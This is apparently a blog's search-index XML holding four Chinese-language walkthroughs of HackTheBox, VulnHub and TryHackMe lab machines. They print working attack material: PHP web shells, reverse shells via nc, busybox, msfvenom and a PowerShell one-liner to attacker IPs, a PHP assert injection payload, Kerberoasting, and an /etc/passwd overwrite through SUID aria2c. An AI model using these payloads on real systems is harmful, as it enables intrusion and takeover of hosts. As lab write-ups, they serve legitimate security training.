<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Resolute Record</title>
    <url>/2025/05/05/Active/</url>
    <content><![CDATA[<h1 id="Active-Walkthrough"><a href="#Active-Walkthrough" class="headerlink" title="Active Walkthrough"></a>Active Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/148/information">Active</a></p>
<p>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
<p><img src="/picture/image-20250423180214688.png" alt="image-20250423180214688"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 enum4linux 对 SMB 服务进行枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.65.81</span><br></pre></td></tr></table></figure>

<p>仅发现共享目录</p>
<p><img src="/picture/image-20250423152238863.png" alt="image-20250423152238863"></p>
<p>使用 crackmapexec 再次探测 SMB 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.65.81 --shares -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现可读共享文件夹 Replication 以及域名 active.htb</p>
<p><img src="/picture/image-20250423152402436.png" alt="image-20250423152402436"></p>
<p>使用 smbclient 尝试匿名登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.129.65.81/Replication</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250423152641343.png" alt="image-20250423152641343"></p>
<p>在 SMB 共享文件夹 \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups 中发现 Groups.xml</p>
<p><img src="/picture/image-20250423152755362.png" alt="image-20250423152755362"></p>
<p>读取 Groups.xml ，发现泄露域用户名称 active.htb\SVC_TGS 和加密后的 cpassword</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> <span class="attr">image</span>=<span class="string">&quot;2&quot;</span> <span class="attr">changed</span>=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> <span class="attr">uid</span>=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">&quot;U&quot;</span> <span class="attr">newName</span>=<span class="string">&quot;&quot;</span> <span class="attr">fullName</span>=<span class="string">&quot;&quot;</span> <span class="attr">description</span>=<span class="string">&quot;&quot;</span> <span class="attr">cpassword</span>=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="attr">changeLogon</span>=<span class="string">&quot;0&quot;</span> <span class="attr">noChange</span>=<span class="string">&quot;1&quot;</span> <span class="attr">neverExpires</span>=<span class="string">&quot;1&quot;</span> <span class="attr">acctDisabled</span>=<span class="string">&quot;0&quot;</span> <span class="attr">userName</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 gpp-decrypt 解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span><br></pre></td></tr></table></figure>

<p>解密出来的密码为 : GPPstillStandingStrong2k18</p>
<blockquote>
<p>原密文应为有效的Base64字符串，长度是4的倍数，解码后必须为16倍数，不符合的话需要适当添加 &#x3D; 补齐</p>
</blockquote>
<p><img src="/picture/image-20250423152945893.png" alt="image-20250423152945893"></p>
<p>使用各种横向移动方式都登陆不上，比如这个 evil-winrm </p>
<p><img src="/picture/image-20250423155017519.png" alt="image-20250423155017519"></p>
<p>那就不考虑横向移动，尝试使用 impacket-GetUserSPNs 进行 kerberoasting 攻击获得 TGS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.129.65.81 -request &quot;active.htb/SVC_TGS&quot;:&quot;GPPstillStandingStrong2k18&quot;</span><br></pre></td></tr></table></figure>

<p>获得了 Administrator 的 TGS </p>
<p><img src="/picture/image-20250423155135511.png" alt="image-20250423155135511"></p>
<p>使用 hashcat 使用 13100 模式破解 TGS 票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 administrator_hash -a 0 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>Administrator 密码为 Ticketmaster1968</p>
<p><img src="/picture/image-20250423155224852.png" alt="image-20250423155224852"></p>
<p>由于目标主机 SMB 服务又开启了 ADMIN$ 共享</p>
<p>使用 impacket-psexec 通过 SMB 协议连接到目标主机的 ADMIN$ 共享，上传并执行一个恶意服务，获得交互式 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec &quot;active.htb/administrator&quot;:&quot;Ticketmaster1968&quot;@10.129.65.81</span><br></pre></td></tr></table></figure>

<p>拿下域控</p>
<p><img src="/picture/image-20250423160731168.png" alt="image-20250423160731168"></p>
<p>在 Administrator 桌面获得 root.txt</p>
<p><img src="/picture/image-20250423175721815.png" alt="image-20250423175721815"></p>
<p>说实话感觉自己的是非预期做法，结果出去看了看官方的 Waklthrough ，还真是这么做的</p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250423180021328.png" alt="image-20250423180021328"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>HTB</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>Bastard Walkthrough</title>
    <url>/2025/04/26/Bastard/</url>
    <content><![CDATA[<h1 id="Bastard-Walkthrough"><a href="#Bastard-Walkthrough" class="headerlink" title="Bastard Walkthrough"></a>Bastard Walkthrough</h1><p>一台不太像 AD 靶机做法的靶机 …</p>
<h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/7">Bastard</a></p>
<p>Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.</p>
<p><img src="/picture/image-20250425163714704.png" alt="image-20250425163714704"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 nmap 进行端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.129.37.166 --min-rate 2500 </span><br></pre></td></tr></table></figure>

<p>发现 80、135、49154 端口</p>
<p><img src="/picture/image-20250425145207721.png" alt="image-20250425145207721"></p>
<p>对开放端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 80,135,49154 -sC -sV 10.129.37.166</span><br></pre></td></tr></table></figure>

<p>发现 80 端口开放 http 服务同时泄露 robots.txt</p>
<p><img src="/picture/image-20250425145259694.png" alt="image-20250425145259694"></p>
<p>在 robots.txt 中发现有趣文件 CHANGELOG.txt </p>
<p><img src="/picture/image-20250425145344040.png" alt="image-20250425145344040"></p>
<p>CHANGELOG.txt 泄露版本信息：Drupal 7.54</p>
<p><img src="/picture/image-20250425145431637.png" alt="image-20250425145431637"></p>
<p>在这可以发现对应版本漏洞： <a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a> </p>
<p>更改 url、endpoint_path 和核心漏洞利用代码如下：</p>
<p><img src="/picture/image-20250425155306940.png" alt="image-20250425155306940"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>]))&#123;                      </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">            <span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>],                         </span><br><span class="line">            <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://10.10.14.18/&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&#x27;upload&#x27;</span>]) </span><br><span class="line">        );</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;                        </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 php 执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php 41564.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>sudo apt install php-curl</p>
</blockquote>
<p>上传成功：</p>
<p><img src="/picture/image-20250425144952449.png" alt="image-20250425144952449"></p>
<p>能正常执行脚本：</p>
<p><img src="/picture/image-20250425145032428-1746536050427-1.png" alt="image-20250425145032428"></p>
<p>上传 nc.exe ，在 kali 中位于 &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;binaries&#x2F;nc.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload=nc.exe</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/picture/image-20250425154700193.png" alt="image-20250425154700193"></p>
<p>使用 nc.exe 反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=nc.exe -e cmd 10.10.14.18 4444</span><br></pre></td></tr></table></figure>

<p>成功接收回弹到的 shell</p>
<p><img src="/picture/image-20250425154602130.png" alt="image-20250425154602130"></p>
<p>查看系统版本</p>
<p><img src="/picture/image-20250425155916644.png" alt="image-20250425155916644"></p>
<p>发现可以利用内核漏洞提权，利用程序网址在这：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">windows-kernel-exploits&#x2F;MS15-051 at master · SecWiki&#x2F;windows-kernel-exploits</a></p>
<p><img src="/picture/image-20250425162710045.png" alt="image-20250425162710045"></p>
<p>上传漏洞利用程序：ms15-051x64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload=ms15-051x64.exe</span><br></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="/picture/image-20250425163241912.png" alt="image-20250425163241912"></p>
<p>在目标主机执行漏洞利用程序，获得 SYSTEM 账户权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms15-051x64.exe whoami</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250425162954915.png" alt="image-20250425162954915"></p>
<p>使用 msfvenom 制作反弹 shell 程序并上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=8888 -f exe -o root.exe</span><br><span class="line">upload=root.exe</span><br></pre></td></tr></table></figure>

<p>上传成功：</p>
<p><img src="/picture/image-20250425163132236.png" alt="image-20250425163132236"></p>
<p>使用漏洞利用程序执行反弹 shell 程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms15-051x64.exe root.exe</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250425162836444.png" alt="image-20250425162836444"></p>
<p>本机开启 nc 监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure>

<p>获得目标主机 SYSTEM 权限的 shell</p>
<p><img src="/picture/image-20250425162904759.png" alt="image-20250425162904759"></p>
<p>在 Administrator 桌面获得 root.txt</p>
<p><img src="/picture/image-20250425162421416.png" alt="image-20250425162421416"></p>
<p>在用户 dimitris 桌面获得 user.txt</p>
<p><img src="/picture/image-20250425162623914.png" alt="image-20250425162623914"></p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250425163519589.png" alt="image-20250425163519589"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>HTB</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>Assertion101 Walkthrough</title>
    <url>/2025/03/22/Assertion101/</url>
    <content><![CDATA[<h1 id="Assertion-1-0-1-Walkthrough"><a href="#Assertion-1-0-1-Walkthrough" class="headerlink" title="Assertion: 1.0.1 Walkthrough"></a>Assertion: 1.0.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/assertion-101,495/#top">Assertion: 1.0.1</a></p>
<p><img src="/picture/image-20250324142845574.png" alt="image-20250324142845574"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.99</span><br></pre></td></tr></table></figure>

<p>发现 22、80 端口</p>
<p><img src="/picture/image-20250324143056755.png" alt="image-20250324143056755"></p>
<p>对开放的端口做应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80 -A -T4 172.16.33.99</span><br></pre></td></tr></table></figure>

<p>发现 SSH 和 Apache 服务版本较高，漏洞较少且利用复杂，暂不考虑</p>
<p><img src="/picture/image-20250324143630111.png" alt="image-20250324143630111"></p>
<p>先来看 22 端口，尝试直接连接以及弱口令能不能泄露机密信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.99 </span><br></pre></td></tr></table></figure>

<p>很遗憾，失败了，什么也没泄露</p>
<p><img src="/picture/image-20250324143811794.png" alt="image-20250324143811794"></p>
<p>试试 SSH 爆破 root 密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.99</span><br></pre></td></tr></table></figure>

<p>没爆破出来</p>
<p>好吧，看来 22 端口暂时无从下手了，再来看看 80 端口</p>
<p>进行下 WEB 目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.99  </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/wordlists/dirb/big.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/big.txt </span><br></pre></td></tr></table></figure>

<p>说实话，后面几个加了字典的还没不加字典的第一个扫出来的多</p>
<p><img src="/picture/image-20250324144159467.png" alt="image-20250324144159467"></p>
<p>访问页面，你会发现他的超链接做的挺乱的，就以 about 那个页面来说，网站上有三种通向该页面的超链接，但也只有前两种有用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=about</span><br><span class="line">http://172.16.33.99/about.php</span><br><span class="line">http://172.16.33.99/about.html</span><br></pre></td></tr></table></figure>

<p>探寻页面一会后，你会发现，home 、about us、schedule、gallery、blog、contains 这几个页面站内所有链接的 action 都是 # ，说明是无用链接</p>
<p><img src="/picture/image-20250324144732104.png" alt="image-20250324144732104"></p>
<p>再来看看 &#x2F;pages 目录，发现刚好与网页各个展示内容对应</p>
<p><img src="/picture/image-20250324145849180.png" alt="image-20250324145849180"></p>
<p>结合 <code>http://172.16.33.99/index.php?page=about</code> ，可以大胆猜测一下，是否存在文件包含？</p>
<p>尝试包含 &#x2F;etc&#x2F;passwd 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>噢？看来是对关键词做了过滤</p>
<p><img src="/picture/image-20250324150045976.png" alt="image-20250324150045976"></p>
<p>生成长度为一的关键词字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -f /usr/share/crunch/charset.lst symbols-all &gt; s.txt </span><br></pre></td></tr></table></figure>

<p>测试一下有哪些关键词被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w s.txt:VAL -u http://172.16.33.99/index.php?page=VAL -fr &quot;File does not exist&quot;</span><br></pre></td></tr></table></figure>

<p>嗯？还有意外之喜，单引号既然会引起服务端错误，要么是 SQL 注入，要么是命令注入</p>
<p>这里显然不是 SQL 注入，因为响应的页面为空，执行 <code>&#39; or 1=1 #</code> 的响应也为空</p>
<p><img src="/picture/image-20250324151407818.png" alt="image-20250324151407818"></p>
<p>那么就是关于 PHP 内容的命令注入，我们可以将核心代码看成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$page</span>&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>输入的单引号会破坏原语句的结构，导致响应 500</p>
<p>尝试插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;id&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>

<p>语句就变成了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;&#x27;and die(system(&quot;</span>id<span class="string">&quot;)) or &#x27;&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>就可以执行命令</p>
<p><img src="/picture/image-20250324152258829.png" alt="image-20250324152258829"></p>
<p>能执行命令就简单了，直接使用 busybox 反弹 shell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;busybox nc 10.8.0.90 1234 -e /bin/bash&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="/picture/image-20250324152503892.png" alt="image-20250324152503892"></p>
<p>接下来是提权，查看 sudo 版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>

<p>1.8.21 处在 1.8.2 ~ 1.8.31p2 直接，可以使用 CVE-2021-3156 提权</p>
<p><img src="/picture/image-20250324152621815.png" alt="image-20250324152621815"></p>
<p>切换到 &#x2F;tmp 目录，将 exp 上传至目标主机，赋予可执行权限后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250324152956639.png" alt="image-20250324152956639"></p>
<p>切换至 cd 目录，获得 flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root </span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250324153219933.png" alt="image-20250324153219933"></p>
<p>当然，也可以通过 aria2c 的 SUID 权限提权，该文件与 wget 相似，可以远程下载文件</p>
<p><img src="/picture/image-20250324153523310.png" alt="image-20250324153523310"></p>
<p>那么就将目标主机上的 &#x2F;etc&#x2F;passwd 文件拷贝到宿主机，将 root 密码更改为已知，再通过 aria2c 远程下载并覆盖原 &#x2F;etc&#x2F;passwd</p>
<p>由于具有 SUID 的文件运行时会获得 root 权限，所以可以允许修改 &#x2F;etc&#x2F;passwd </p>
<p>生成已知的密码哈希（123）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>

<p>更改后的 passwd</p>
<p><img src="/picture/image-20250324154812796.png" alt="image-20250324154812796"></p>
<p>执行下载命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -o &quot;/etc/passwd&quot; &quot;http://10.8.0.90/passwd&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>

<p>直接使用 su 提权</p>
<p><img src="/picture/image-20250324160332053.png" alt="image-20250324160332053"></p>
<p>也可以制作 SSH 公钥直接写入 root 账号根目录下，然后我在用我的私钥直接和目标主机服务端 SSH 建立连接</p>
<p>生成 ssh 公私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250324161554295.png" alt="image-20250324161554295"></p>
<blockquote>
<p>直接一路回车就行，生成的公私钥在 .ssh 目录</p>
</blockquote>
<p><img src="/picture/image-20250324160802504.png" alt="image-20250324160802504"></p>
<p>将公钥上传至 root 账号根目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -d /root/.ssh/ -o authorized_keys &quot;http://10.8.0.90/id_rsa.pub&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250324161339594.png" alt="image-20250324161339594"></p>
<p>再宿主机 .ssh 目录使用 SSH 远程登陆</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh root@172.16.33.99   </span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="/picture/image-20250324161449534.png" alt="image-20250324161449534"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Blueprint Walkthrough</title>
    <url>/2025/04/18/Blueprint/</url>
    <content><![CDATA[<h1 id="Blueprint-Walkthrough"><a href="#Blueprint-Walkthrough" class="headerlink" title="Blueprint Walkthrough"></a>Blueprint Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://tryhackme.com/room/blueprint">blueprint</a></p>
<p>Hack into this Windows machine and escalate your privileges to Administrator.</p>
<p><img src="/picture/image-20250419200643931.png" alt="image-20250419200643931"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标主机做全端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 10.10.253.208 --min-rate 500 </span><br></pre></td></tr></table></figure>

<p>发现开放 80 、135、139、443、445、3306、8080 端口</p>
<p><img src="/picture/image-20250419191935702.png" alt="image-20250419191935702"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80,135,139,443,445,3306,8080 -sC -sV 10.10.253.208</span><br></pre></td></tr></table></figure>

<p>80、8080 开放 HTTP 服务，443 端口开放 SSL&#x2F;HTTP 服务，139&#x2F;445 端口开放 SMB 服务，135 端口开放 RPC 服务</p>
<p><img src="/picture/image-20250419192043241.png" alt="image-20250419192043241"></p>
<p>先来看 SMB 服务，使用 smbclient 枚举共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.10.253.208</span><br></pre></td></tr></table></figure>

<p>发现共享目录 Users 和 Windows</p>
<p><img src="/picture/image-20250419192254263.png" alt="image-20250419192254263"></p>
<p>远程登陆 Users 共享目录，枚举文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.253.208/Users</span><br></pre></td></tr></table></figure>

<p>找了一圈并没有泄露机密信息</p>
<p><img src="/picture/image-20250419192503970.png" alt="image-20250419192503970"></p>
<p>再来看 Windows 共享目录，之前权限不够，不能进行枚举</p>
<p><img src="/picture/image-20250419192610376.png" alt="image-20250419192610376"></p>
<p>来看 135 端口，rpcclient 能连接但是是权限不够，不能进行枚举</p>
<p><img src="/picture/image-20250419192726207.png" alt="image-20250419192726207"></p>
<p>enum4linux 也什么都跑不出来，最后只剩 HTTP 和 SSL&#x2F;HTTP 服务了，依次访问主页面，发现仅 8080 端口正常响应</p>
<p>&#x2F;docs 似乎是一些文件</p>
<p><img src="/picture/image-20250419193435437.png" alt="image-20250419193435437"></p>
<p>&#x2F;catalog 响应页面但是排版错乱，网页内链接指向 localhost，需要进行 SSH 端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start ssh</span><br><span class="line">ssh -CNfg -L 8080:10.10.253.208:8080 kali@127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250419192932929.png" alt="image-20250419192932929"></p>
<p>再次访问即可响应正常页面</p>
<p><img src="/picture/image-20250419193051077.png" alt="image-20250419193051077"></p>
<p>依据 URL 中泄露的版本搜索 EXP ，<a href="https://www.exploit-db.com/exploits/43191">https://www.exploit-db.com/exploits/43191</a> 指名存在文件上传漏洞，需要登录才能利用</p>
<p>该网站似乎并没有配置完全，需要 New Installation 才行</p>
<p><img src="/picture/image-20250419193725210.png" alt="image-20250419193725210"></p>
<p>第一步存在弱口令，账号为 root 密码为空</p>
<p><img src="/picture/image-20250419193852985.png" alt="image-20250419193852985"></p>
<p>这里泄露了网站根目录 C:&#x2F;xampp&#x2F;htdocs&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;</p>
<p><img src="/picture/image-20250419174200720.png" alt="image-20250419174200720"></p>
<p>设置账号密码为 admin&#x2F;admin</p>
<p><img src="/picture/image-20250419174259691.png" alt="image-20250419174259691"></p>
<p>编辑上传的 PHP 木马文件 shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&gt;</span><br><span class="line">&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">		exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;cmd&quot;).focus();&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>使用 python2 执行该漏洞利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 43191.py -u http://10.10.253.208:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php</span><br></pre></td></tr></table></figure>

<p>成功上传木马文件</p>
<p><img src="/picture/image-20250419174352072.png" alt="image-20250419174352072"></p>
<p>由于目标主机系统为 Windows 使用 powershell 反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.8.99.84&#x27;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>

<p>成功接收回弹的 shell</p>
<p><img src="/picture/image-20250419175536025.png" alt="image-20250419175536025"></p>
<p>进入 Administrator 的桌面即可获得 root.txt</p>
<p><img src="/picture/image-20250419175503612.png" alt="image-20250419175503612"></p>
